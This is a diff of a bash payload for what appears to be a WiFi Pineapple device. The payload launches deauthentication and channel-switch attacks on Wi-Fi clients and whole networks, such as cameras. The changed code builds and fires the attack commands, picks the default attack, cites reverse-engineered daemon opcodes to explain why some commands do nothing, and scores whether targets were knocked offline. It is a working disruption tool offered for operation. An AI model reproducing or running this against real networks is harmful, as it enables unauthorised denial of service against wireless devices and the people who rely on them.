@@ -607,25 +607,35 @@ posture_from_caps() {   # posture_from_caps <rsncaps_hex|-> <extcap_hex|-> <band
 # The three operator-selectable attacks. The badge advises; it never decides.
 #   DEAUTH  PINEAPPLE_DEAUTH_CLIENT     [bssid] [target] [channel]  deauth + disassoc, one client
 #   CSA     PINEAPPLE_DEAUTH_CLIENT_CSA [bssid] [channel]           channel switch, WHOLE BSS
-#   BOTH    PINEAPPLE_DEAUTH_CLIENT_ALL [bssid] [target] [channel]  all three types, WHOLE BSS
+#   BOTH    PINEAPPLE_DEAUTH_CLIENT     [bssid] [target] [channel]  the deauth above, and then a
+#                                                                    CSA issued as a SECOND command
 #
-# ONLY DEAUTH IS TARGETED, and only on a client row. attack_scope() below is the one place that
-# decides; the picker's ' bss' marker and the pre-transmit confirm both read it, so the breadth is
-# stated where the operator chooses and again before anything is sent.
+# NEITHER _ALL NOR _CSA IS USED, and that is the correction of record. Both send pineapd opcode 402
+# -- CSA only -- and build no deauth frame at all: StartDeauthAll emits li a0,402 at 0x0086c62c,
+# the same immediate as StartDeauthCsa, while StartDeauth emits li a0,400. pineapd HAS a deauth+CSA
+# opcode (401, dispatched correctly at 0x473528) but li/ori a0,401 occur zero times in the Go
+# daemon, so that path is dead code. BOTH therefore issues the opcode-400 deauth with the row's
+# target and then calls csa_issue for the CSA leg. [V] CLAUDE.md "Third contact" has the addresses.
+#   The missing-'sta' throw at 0x473824 is NOT why _ALL does nothing: it is real, and it carries the
+#   wrong message (it reuses the missing-BSSID string at 0x4739dc), but the Go layer supplies an sta
+#   for all three commands -- _ALL writes ff:ff:ff:ff:ff:ff by immediate, _CSA the zero value -- so
+#   no shipped command reaches it. An earlier revision of this comment and of the selftest's
+#   posture_expect preamble offered that throw as the explanation; it is withdrawn.
+#
+# attack_scope() below is the one place blast radius is decided; the picker's ' bss' marker and the
+# pre-transmit confirm both read it, so the breadth is stated where the operator chooses and again
+# before anything is sent.
 #   CSA has no [target] argument at all, so its breadth is certain from the signature.  [V]
-#   BOTH has one in hak5cmd's help text, and the help text is wrong: pineAPdDeauthAll parses ONE
-#        MAC where pineAPdDeauth parses two, and its request struct carries no target field. The
-#        discriminating measurements are in CLAUDE.md "2.0.0-stable, analysed"; the frame split
-#        that carries them is StartDeauth 32 against StartDeauthAll/StartDeauthCsa 28.  Readings
-#        [V] from the 1.1.3 and 2.0.0 daemons; "parses the bssid, discards the target" is [A] --
-#        falsify by firing BOTH at one client among several and seeing whether the others stay
-#        associated. resp_fire still passes three positionals; json.Unmarshal drops the extra.
-#   NB the three pineAPd* HTTP handlers share one 16-byte http.HandlerFunc frame, so the frame
-#      does NOT discriminate among them -- an earlier revision of this comment said it did, and
-#      attributed the 32-vs-28 split to the wrong trio.
-# posture_opts still orders by efficacy (best first), and pick_list preselects element 0, so a
-# BSS-wide attack is the default on the common badges. That is deliberate: the marker and the
-# confirm carry the breadth, rather than demoting the attack most likely to work.
+#   DEAUTH parses two addresses and is the only key that can aim, which it does on a client row.
+#   BOTH is scope bss by decision, not by signature -- its deauth leg can aim but its CSA leg
+#        cannot. See attack_scope.
+# posture_opts orders by efficacy (best first) and pick_list preselects element 0, so the DEFAULT
+# attack is whatever posture_opts leads with -- DEAUTH on every badge it offers anything for, since
+# a9575a2, that being the one key measured to reach the air here. So the default is targeted on a
+# client row and BSS-wide on an AP row (where DEAUTH's target resolves to ff:ff:ff:ff:ff:ff), and
+# the two BSS-wide keys stay on the list below it. The ' bss' marker and the confirm carry the
+# breadth, rather than demoting the attack most likely to work. (Until a9575a2 this led BOTH, so a
+# BSS-wide attack was the default on every badge; that is what the sentence here used to say.)
 response_cmd() {
   case "$1" in
     DEAUTH) printf 'PINEAPPLE_DEAUTH_CLIENT' ;;
@@ -643,8 +653,15 @@ response_cmd() {
 
 # attack_scope <attack key> -> cli | bss.  Reads R_TARGET, so call it after resp_target.
 # Read from the signatures (response_cmd above): CSA takes <bssid> <ch> and has no target argument
-# at all, so it is BSS-wide by construction; _ALL advertises [target] but parses one MAC, so its
-# target is accepted and discarded; only DEAUTH parses two and can aim.
+# at all, so it is BSS-wide by construction; only DEAUTH parses two addresses and can aim.
+# BOTH stays bss, and that is an integrator DECISION rather than a reading of one command's
+# signature, because BOTH is no longer one command: it is the opcode-400 deauth -- which can aim --
+# followed by a CSA leg whose own signature makes it BSS-wide. Two reasons it is reported as bss.
+# At the shipped default, SWEEP_TARGETED=1, the targeted sweep follows the deauth, so every
+# recovered member is hit anyway and 'bss' is simply true. With SWEEP_TARGETED=0 on a client row
+# the attempt is one targeted deauth plus a BSS-wide CSA leg, so 'bss' over-states the deauth's
+# reach while stating the attempt's correctly -- and over-stating the blast radius in the picker
+# and in the confirm is the safe direction for a key the operator is about to press.
 # [A] An AP row resolves R_TARGET to ff:ff:ff:ff:ff:ff and this reports that as BSS-wide. Nothing
 # in the repo records pineapd honouring a broadcast [target] rather than rejecting it. Note the
 # failure is NOT self-announcing: an earlier version of this comment claimed a rejected attack
@@ -686,8 +703,8 @@ posture_expect() {
   [ -n "${CSA_INJECTOR:-}" ] && [ -x "${CSA_INJECTOR:-}" ] && inj=1
   [ "$b" = NOINJ ] && { printf 'blocked'; return 0; }
   [ "$b" = NONE ]  && { printf 'blocked'; return 0; }
-  # CSA and BOTH transmit NOTHING on this firmware, whatever the beacon says, so the badge cannot
-  # speak for them. This label records a MEASUREMENT, not a mechanism: on 2026-11-09, on
+  # The firmware CSA transmits NOTHING useful whatever the beacon says, so the badge cannot speak
+  # for the keys that carry one. This label records a MEASUREMENT, not a mechanism: on 2026-11-09, on
   # fc:58:5a:08:42:15 ch 8, PINEAPPLE_DEAUTH_CLIENT with ff:ff:ff:ff:ff:ff dropped a client on
   # demand while PINEAPPLE_DEAUTH_CLIENT_ALL with that SAME address, minutes later, did nothing --
   # one address, one channel, one BSSID, two outcomes -- and the mechanism IS settled: _ALL and _CSA
@@ -1535,45 +1552,63 @@ lock_target() {   # lock_target <bssid> <secs> [channel]; the channel defaults t
   sleep 0.5; c1=$(cur_channel); sleep 0.5; c2=$(cur_channel); sleep 0.5; c3=$(cur_channel)
   raw="${c1:-_}/${c2:-_}/${c3:-_}"      # kept BEFORE the backfill: this is what the operator gets told
   LOCK_TEXT="$RECON_IF ch ${c3:-?}, target ch $want"
-  # rc 3, not 0: we could not read the channel back, so we do not know whether the lock took.
-  # Returning 0 here recorded lock=ok for a lock that was never verified, and LOCK_TEXT never
-  # reached the operator. Proceeding is still right -- the alternative is refusing every response
-  # on a device whose channel cannot be read -- but it must be labelled honestly in the loot.
-  [ -z "$c3" ] && { LOCK_TEXT="$RECON_IF: no channel read-back ($raw), lock unverified"; return 3; }
   # A transient unreadable sample is not evidence of hopping. Measured on the bench 2026-11-09:
   # c1 came back EMPTY while c2 and c3 both read 1 and the target channel WAS 1 -- the radio was
   # parked exactly where it was asked to be -- yet the all-three-equal test below scored that
   # "still hopping (/1/1)", returned 2, and refused the whole response (loot row LOCK_FAILED on
   # 50:92:6a:ae:a8:82). cur_channel returns empty on a read it cannot parse, which is a missing
   # sample, not a different channel; compare only the samples we actually got.
-  # Backfill from the LAST sample outward. c3 is known non-empty -- the rc 3 guard above returned if
-  # it was not -- so repairing c2 from c3, then c1 from the REPAIRED c2, collapses any run of
-  # unreadable samples onto the one reading we actually have. The other order copied c2 into c1
-  # before c2 itself was repaired, so with c1 AND c2 both unreadable c1 stayed empty and the
-  # all-three-equal test below scored "still hopping (/1/1)" -- character for character the bench
-  # symptom this repair was added to stop. The measured case (ONE empty sample) passed either way,
-  # which is why neither the harness nor the selftest caught it; the audit did. The selftest cases
-  # are inline below (search 'lock_target:'), not in a helper -- an earlier version of this line
-  # said "st_lock covers both" and no such function has ever existed.
+  #
+  # HOW MANY samples we got is the whole decision, and until 2026-11-15 the POSITION of the
+  # unreadable one decided it too. An early `[ -z "$c3" ] && return 3` sat here, so 8/8/_ was rc 3
+  # (unverified) while _/8/8 was rc 0 (verified) -- two readable, agreeing samples and the same
+  # target channel in both, scored differently because of which slot the empty read landed in.
+  # The count is the evidence; the slot is an artefact of when cur_channel happened to fail. So:
+  #   ngood 0        -> rc 3, nothing was read at all
+  #   ngood 1        -> rc 3, one sample cannot establish that a radio is PARKED rather than
+  #                     passing through (the comparison below degenerates to c3 = c3 = c3)
+  #   ngood 2 or 3   -> compare the readable ones: agreeing and on target is rc 0, disagreeing is
+  #                     rc 2 (hopping/mismatch)
+  # Falsified by: any pair of sample patterns with the same ngood and the same readable values
+  # returning different rcs.
   ngood=0
   [ -n "$c1" ] && ngood=$(( ngood + 1 ))
   [ -n "$c2" ] && ngood=$(( ngood + 1 ))
   [ -n "$c3" ] && ngood=$(( ngood + 1 ))
+  # rc 3, not 0: we could not read the channel back, so we do not know whether the lock took.
+  # Returning 0 here recorded lock=ok for a lock that was never verified, and LOCK_TEXT never
+  # reached the operator. Proceeding is still right -- the alternative is refusing every response
+  # on a device whose channel cannot be read -- but it must be labelled honestly in the loot.
+  if (( ngood == 0 )); then
+    LOCK_TEXT="$RECON_IF: no channel read-back ($raw), lock unverified"; return 3
+  fi
+  # Backfill from the LAST READABLE sample outward, which is what makes the three patterns with one
+  # empty slot agree. c3 is repaired first (from c2, else from c1 -- `${c2:-$c1}`, which is the
+  # 8/_/_ case and the reason the fallback is there at all), then c2 from the repaired c3, then c1
+  # from the repaired c2, collapsing any run of unreadable samples onto the readings we do have.
+  # Copying c2 into c1 BEFORE c2 itself was repaired left c1 empty when c1 AND c2 were both
+  # unreadable, and the all-three-equal test then scored "still hopping (/1/1)" -- character for
+  # character the bench symptom this repair was added to stop. The measured case (ONE empty sample)
+  # passed either way, which is why neither the harness nor the selftest caught it; the audit did.
+  # The selftest cases are inline below (search 'lock_target:'), not in a helper -- an earlier
+  # version of this line said "st_lock covers both" and no such function has ever existed.
+  [ -z "$c3" ] && c3="${c2:-$c1}"
   [ -z "$c2" ] && c2="$c3"
   [ -z "$c1" ] && c1="$c2"
+  # ⚠ ONE readable sample cannot establish that the radio is parked, and the backfill above makes
+  # the comparison below PASS on one: with two slots unreadable the test becomes c3 = c3 = c3, a
+  # tautology carrying no stability information at all. Until 2026-11-10 that returned 0 and wrote
+  # lock=ok -- MORE confidence from LESS evidence than the two-readable-samples case beside it.
+  # rc 3 still PROCEEDS, so the 2026-11-09 fix (never refuse a parked radio over a transient empty
+  # read) is intact; only the label changes, and the loot stops asserting a verification that did
+  # not happen. Hoisted out of the all-equal branch 2026-11-15: one readable sample always
+  # backfills to all-equal, so the two placements agree, and out here it reads as the ngood rule it
+  # is rather than as a special case of agreement.
+  if (( ngood < 2 )); then
+    LOCK_TEXT="$RECON_IF ch $c3 from ONE readable sample ($raw): lock unverified"
+    return 3
+  fi
   if [ "$c1" = "$c2" ] && [ "$c2" = "$c3" ]; then
-    # ⚠ ONE readable sample cannot establish that the radio is parked, and the backfill above makes
-    # the comparison PASS on one: with c1 AND c2 unreadable the test becomes c3 = c3 = c3, a
-    # tautology carrying no stability information at all. Until 2026-11-10 that returned 0 and wrote
-    # lock=ok -- MORE confidence from LESS evidence than the two-readable-samples case beside it,
-    # which returns 3 -- inverting the contract this function states ten lines above. One sample now
-    # reports the unverified state that already exists. rc 3 still PROCEEDS, so the 2026-11-09 fix
-    # (never refuse a parked radio over a transient empty read) is intact; only the label changes,
-    # and the loot stops asserting a verification that did not happen.
-    if (( ngood < 2 )); then
-      LOCK_TEXT="$RECON_IF ch $c3 from ONE readable sample ($raw): lock unverified"
-      return 3
-    fi
     [ "$c3" = "$want" ] || [ "$want" = 0 ] && return 0
     # The FOURTH read, which both the 2026-11-09 and 2026-11-10 repairs stopped short of: they
     # protected c1-c3 and left this one bare, so one transient empty here still scored
@@ -2095,9 +2130,10 @@ csa_newchan() {
   esac
 }
 
-# csa_issue -> 0 when a CSA was issued, non-zero when nothing was. Sets CSA_CMD (what the loot
-# should name) and CSA_ERR (the diagnostic), because the two senders disagree about which signal
-# means failure:
+# csa_issue -> 0 a CSA was issued, 2 issued and then capped mid-run, 3 the injector was capped or
+# killed with NO evidence that anything was sent (unknown, not refused), 1 a refusal. Sets CSA_CMD
+# (what the loot should name) and CSA_ERR (the diagnostic), because the two senders disagree about
+# which signal means failure:
 #   hak5cmd  exits 0 on EVERY path including its errors and writes them to stderr, so STDERR is the
 #            only signal and rc is worthless (measured 2026-11-05).
 #   pagerinj returns `failed && !sent ? 1 : 0` and prints its sent=/failed= summary to stderr even
@@ -2139,7 +2175,7 @@ csa_clamp() {
 
 CSA_CMD=''; CSA_ERR=''
 csa_issue() {
-  local nc rc err fw ipid
+  local nc rc err fw ipid icls
   CSA_CMD=''; CSA_ERR=''
   csa_clamp
   if [ -n "$CSA_INJECTOR" ] && [ -x "$CSA_INJECTOR" ]; then
@@ -2171,19 +2207,43 @@ csa_issue() {
       ipid=$!; child_add "$ipid"; wait "$ipid"; rc=$?; child_del "$ipid"
       err=$(tr '\n' ' ' <"$FIRE_ERR" 2>/dev/null); rm -f "$FIRE_ERR"
       CSA_CMD="${CSA_INJECTOR##*/}:ch$nc:n$CSA_COUNT"   # expansion, not basename: one less command to exist
-      log resp "csa inject $CSA_CMD rc=$rc${err:+ out=${err:0:200}}"
-      (( rc == 0 )) && return 0
-      # rc 2 means "it DID transmit and was then capped". Distinguishing it from "it sent nothing"
-      # is not cosmetic: resp_fire's refusal path writes CMD_REFUSED, which asserts no frame left
-      # the radio, and the harness comment on that row says in as many words that CMD_REFUSED
-      # "would be a lie: a frame WAS transmitted". A capped run has pagerinj's own
-      # `interrupted: sent=N failed=0` on stderr, so the evidence is right there in `err`.
-      if (( rc == 124 )) || (( rc >= 128 )) || printf '%s' "$err" | grep -q 'sent=[1-9]'; then
-        CSA_ERR="injector capped after transmitting (rc $rc): ${err:0:160}"
-        return 2
+      # Classify FIRST, then log once, so the log carries the answer the caller gets (issue=N) next
+      # to the wrapper status it was derived from. `rc` is `timeout`'s, not the injector's, and the
+      # two are not the same number: an injector that transmitted and was then capped comes back
+      # 124 whatever it exited with.
+      #
+      # THREE outcomes, not two, and the split is evidence-based rather than rc-based:
+      #   sent=[1-9] on stderr          -> 2  frames provably left the radio; the run was then cut
+      #                                      short, so distrust the DWELL, not the transmission.
+      #   rc 124 / >= 128, no sent=     -> 3  capped or killed with NO send evidence. Until
+      #                                      2026-11-15 this returned 2 as well, which asserted a
+      #                                      transmission nobody observed. rc 3 is "unknown", not
+      #                                      "refused": the caller proceeds but must not claim
+      #                                      either way.
+      #   anything else                 -> 1  a refusal, as before.
+      #
+      # Why "no summary" is read as "no evidence", from pagerinj.c rather than from the harness
+      # stub, because the two differ and only one of them transmits: the summary at
+      # `pagerinj.c:1604` is printed AFTER the transmit loop (`while (!stop_flag)`, :1564), and the
+      # SIGINT/SIGTERM handler is installed at :1531-1532, i.e. AFTER the beacon capture whose own
+      # failure exits `return 1` with no summary at all (:1468). So a SIGTERM that lands IN the
+      # loop is caught, the loop breaks (:1576) and the summary prints with its `interrupted: `
+      # prefix -- that run reaches us as 124 WITH sent=N, which is rc 2. A 124 with no summary is a
+      # run signalled BEFORE the handler existed (still waiting for a beacon to clone) or one that
+      # never got to print at all (`timeout -k`'s SIGKILL). Neither put a frame on the air that it
+      # is willing to claim, and neither should we.
+      # Falsified by: a pagerinj run whose stderr carries no sent= line and which did put a frame on
+      # the air, or an injector that reports sent=N>0 without transmitting.
+      if   (( rc == 0 )); then icls=0
+      elif printf '%s' "$err" | grep -q 'sent=[1-9]'; then
+        icls=2; CSA_ERR="injector capped after transmitting (rc $rc): ${err:0:160}"
+      elif (( rc == 124 )) || (( rc >= 128 )); then
+        icls=3; CSA_ERR="injector capped with no send evidence (rc $rc): ${err:0:160}"
+      else
+        icls=1; CSA_ERR="injector rc $rc: ${err:0:160}"
       fi
-      CSA_ERR="injector rc $rc: ${err:0:160}"
-      return 1
+      log resp "csa inject $CSA_CMD rc=$rc issue=$icls${err:+ out=${err:0:200}}"
+      return $icls
     fi
   fi
   fw=$(response_cmd CSA)
@@ -2199,7 +2259,7 @@ csa_issue() {
 
 resp_fire() {   # resp_fire <mac> <attack key> <badge> -> 0 when a verdict was reached
   local mac="$1" k="$2" badge="$3" cmd lock rc m p0 t0 p1 t1 present verdict nmv=0 nne=0 ninc=0 n
-  local scope tgt_verdict=- cap_secs lock_secs csa_secs=0 t_cap frc ferr nmeas=0 nomem=''
+  local scope tgt_verdict=- cap_secs lock_secs csa_secs=0 t_cap frc ferr nmeas=0 nomem='' csa_unknown=0
   local -a subjects=(); local -A P0=() T0=()
   RESP_MEMBERS=(); RESP_MEMBERS_BSS=''      # never inherit a previous target's set
   cmd=$(response_cmd "$k")
@@ -2331,6 +2391,19 @@ resp_fire() {   # resp_fire <mac> <attack key> <badge> -> 0 when a verdict was r
       LOG yellow "CSA injector was capped after transmitting; measuring anyway"
       log resp "csa capped-after-send ${ferr:0:160}"
       frc=0; ferr=''
+    elif (( frc == 3 )); then
+      # rc 3 is "capped or killed with NO send evidence": neither a refusal nor a send. Proceeding
+      # is right -- the measurement is the only thing that could still show an effect -- but the
+      # OPEN question is what it may then be read as saying. A subject that keeps transmitting is
+      # NO_EFFECT, which in responses.tsv reads as the firmware fact "a CSA does not move this
+      # camera"; with nothing known to have been transmitted, "nothing was sent" explains the same
+      # counters exactly as well, so that reading is not available and the verdict is downgraded to
+      # INCONCLUSIVE below. MOVED is left alone: it is not explained by an absent frame, so it
+      # stands on the counters as it would on any other fire. The loot's cmd column marks the leg
+      # `?`, the same "which legs went out" slot BOTH uses.
+      LOG yellow "CSA injector was capped with no send evidence; measuring, but nothing is claimed"
+      log resp "csa capped-no-send ${ferr:0:160}"
+      csa_unknown=1; cmd="$CSA_CMD?"; frc=0; ferr=''
     fi
   else
     : >"$FIRE_ERR"
@@ -2352,12 +2425,19 @@ resp_fire() {   # resp_fire <mac> <attack key> <badge> -> 0 when a verdict was r
   if [ "$k" = BOTH ]; then
     csa_issue; local crc=$?
     # 0 sent cleanly, 2 sent then capped. Both put frames on the air, so both name the sender in
-    # the loot; only a real failure takes the warning branch.
+    # the loot; only a real failure takes the warning branch. 3 is neither: the leg was capped or
+    # killed with no send evidence, so it is recorded as UNKNOWN rather than counted as a send or
+    # reported as a failure. No downgrade of the verdict here, unlike the CSA arm: the deauth leg
+    # has already left the radio, so NO_EFFECT still has a frame behind it and remains a reading.
     if (( crc == 0 )) || (( crc == 2 )); then
       (( crc == 2 )) && log resp "csa leg capped after sending ${CSA_ERR:0:160}"
       # Keep the firmware spelling stable for readers and for the gates; name the injector when it
       # is what actually sent, since "which CSA was this" is the first question a loot row raises.
       case "$CSA_CMD" in PINEAPPLE_*) cmd="$cmd+CSA" ;; *) cmd="$cmd+$CSA_CMD" ;; esac
+    elif (( crc == 3 )); then
+      LOG yellow "CSA leg sent nothing it can prove; the deauth was still transmitted"
+      log resp "csa leg unknown ${CSA_ERR:-unknown}"
+      case "$CSA_CMD" in PINEAPPLE_*) cmd="$cmd+CSA?" ;; *) cmd="$cmd+$CSA_CMD?" ;; esac
     else
       LOG yellow "CSA leg did not send; the deauth was still transmitted"
       log resp "csa leg failed ${CSA_ERR:-unknown}"
@@ -2373,9 +2453,10 @@ resp_fire() {   # resp_fire <mac> <attack key> <badge> -> 0 when a verdict was r
   # that filter broadcast. Doing both is better than either, and costs n frames instead of one.
   # Not for CSA: that command takes no target (<bssid> <channel>, arity measured on the device).
   # Guarded on SCOPE, not on R_TARGET being broadcast. attack_scope is the single place blast radius
-  # is decided, and a CLIENT row firing BOTH is scope=bss with R_TARGET set to the client - _ALL
-  # discards that target and goes BSS-wide regardless - so an R_TARGET test would skip the sweep in
-  # exactly the case it is most needed. Unreachable until the inverse lookup lands; wrong now.
+  # is decided, and a CLIENT row firing BOTH is scope=bss with R_TARGET set to the client - the
+  # deauth leg aims at it and the CSA leg goes BSS-wide regardless - so an R_TARGET test would skip
+  # the sweep in exactly the case it is most needed. Unreachable until the inverse lookup lands;
+  # wrong now.
   # Not when nomem is set: the one subject is then the broadcast placeholder, not a station.
   if [ "$SWEEP_TARGETED" = 1 ] && [ "$k" != CSA ] && [ "$scope" = bss ] && (( n > 0 )) && [ -z "$nomem" ]; then
     local sw_cmd sw_ok=0 sw_rc sw_err
@@ -2401,6 +2482,13 @@ resp_fire() {   # resp_fire <mac> <attack key> <badge> -> 0 when a verdict was r
     p0="${P0[$m]}"; t0="${T0[$m]}"; present=1; p1=-; t1=-
     if [ -n "${RS_PK[$m]+x}" ]; then p1="${RS_PK[$m]}"; t1="${RS_T[$m]}"; else present=0; fi
     verdict=$(resp_verdict "$p0" "$t0" "$p1" "$t1" "$present")
+    # A CSA leg that cannot prove it transmitted cannot support NO_EFFECT: "the frame landed and
+    # the camera ignored it" and "no frame left the radio" predict the same unchanged counters, and
+    # the first of those is a firmware answer this rung exists to produce honestly. Only set on the
+    # CSA arm (k = CSA), where the unproven leg is the ONLY leg; on BOTH the deauth went out, so
+    # NO_EFFECT keeps a transmission behind it. MOVED is not downgraded either way -- an absent
+    # frame does not explain a subject going quiet.
+    (( csa_unknown )) && [ "$verdict" = NO_EFFECT ] && verdict=INCONCLUSIVE
     case "$verdict" in MOVED) nmv=$((nmv + 1)) ;; NO_EFFECT) nne=$((nne + 1)) ;; *) ninc=$((ninc + 1)) ;; esac
     [ "$m" = "$R_TARGET" ] && tgt_verdict="$verdict"
     resp_write "$mac" "$badge" "$k" "$cmd" "$lock" "$p0" "$p1" "$verdict" "$m"
@@ -2471,7 +2559,13 @@ disrupt_menu() {   # the three attacks, ordered and labelled by what the beacon 
   if [ -z "$opts" ]; then
     LOG red "$(posture_why "$badge")"
     confirm "Nothing is expected to work ($badge). Try anyway?" || return 0
-    opts='BOTH DEAUTH CSA'
+    # Same order as posture_opts, which leads DEAUTH on every badge it offers anything for (a9575a2)
+    # because it is the one key measured to reach the air on this firmware. pick_list preselects
+    # element 0, so this string IS the default attack on a badge where nothing is expected to work;
+    # it led BOTH until 2026-11-15, i.e. the blind fallback preselected a different key from every
+    # other picker in the payload. The selftest reads this literal out of the file and compares it
+    # with posture_opts' own output, so the two cannot drift apart silently.
+    opts='DEAUTH BOTH CSA'
   elif [ "$badge" = '?' ]; then
     # No beacon was captured, so nothing below is advice -- say so instead of firing on one accept.
     confirm "Posture unread on ${R_BSSID:9}: no beacon captured. Fire blind?" || return 0
@@ -2497,11 +2591,19 @@ disrupt_menu() {   # the three attacks, ordered and labelled by what the beacon 
   resp_fire "$mac" "$choice" "$badge"
 }
 
-posture_why() {   # one line of plain English for a badge
+# posture_why <badge> -> one line of plain English for a badge.
+# It and posture_expect are printed on the same screen, so they must not contradict each other.
+# They did: these lines said "CSA lands" / "CSA still lands" from the badge alone, while
+# posture_expect labels CSA 'fw-broken' with no injector configured -- the firmware CSA announces
+# channel 14 with Channel Switch Count 0 and is a no-op on a US client whatever the crypto says.
+# The wording now names the injector, which is true in BOTH states: with one configured the CSA
+# leg really transmits (csa_issue routes to it), without one nothing goes out. The badge still
+# governs the deauth half, which is what the badge is actually evidence about.
+posture_why() {
   case "$1" in
-    'D+C')   printf 'no PMF: deauth and CSA both land' ;;
-    'D?+C')  printf 'PMF optional: deauth works per-client, CSA lands' ;;
-    'C')     printf 'PMF required: deauth is ignored, CSA still lands' ;;
+    'D+C')   printf 'no PMF: deauth lands; CSA only with an injector' ;;
+    'D?+C')  printf 'PMF optional: deauth works per-client; CSA only with an injector' ;;
+    'C')     printf 'PMF required: deauth is ignored; CSA only with an injector' ;;
     'NONE')  printf 'PMF + beacon protection: no frame this firmware sends works' ;;
     'NOINJ') printf 'DFS or 6 GHz: the radio may not transmit on this channel' ;;
     *)       printf 'posture unread: no beacon captured' ;;
